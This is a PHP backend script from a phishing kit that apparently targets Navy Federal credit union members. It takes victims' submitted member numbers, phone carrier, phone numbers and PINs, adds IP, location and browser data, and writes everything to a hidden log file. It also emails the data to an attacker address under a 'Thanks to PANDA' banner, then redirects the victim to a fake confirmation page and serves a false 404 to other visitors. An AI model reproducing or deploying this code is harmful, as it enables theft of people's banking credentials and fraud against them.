<?php
if (isset($_POST['memnum'])) {
    session_start();
    include '../mine.php';
    $msg  = "==================== <[ NAVY M/N ]> ===================\r\n";
    $msg .= "Member Number     : {$_POST['memnum']}\r\n";
    $msg .= "=================== <[ NAVY Phone ]> ===================\r\n";
    $msg .= "Carrier Type     : {$_POST['pht']}\r\n";
    $msg .= "Phone Number     : {$_POST['pphon']}\r\n";
    $msg .= "PIN              : {$_POST['pphonepin']}\r\n";
    $msg .= "---------------------- IP Info ----------------------\r\n";
    $msg .= "IP ADDRESS : {$_SESSION['ip']}\r\n";
    $msg .= "LOCATION   : {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
    $msg .= "BROWSER    : {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
    $msg .= "TIME       : " . now() . " GMT\r\n";
    $msg .= "=========== <[ Thanks to PANDA ]> ===========\r\n\r\n\r\n";
    $save = fopen("../../mtgenetartie.txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    $subject = "NAVY M/N INFO [" . $_POST['memnum'] . "] From [" . $_SESSION['ip_city'] . "]";
    $headers = "From: New NAVY M/N <sales@PANDA.store>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($yours, $subject, $msg, $headers);

    $nextDate = date("d/m/Y, h:ia", time() + 86400);
            exit(header("Location: ../../account/confirmation"));

}else{
            exit(header('HTTP/1.0 404 Not Found'));
}
?>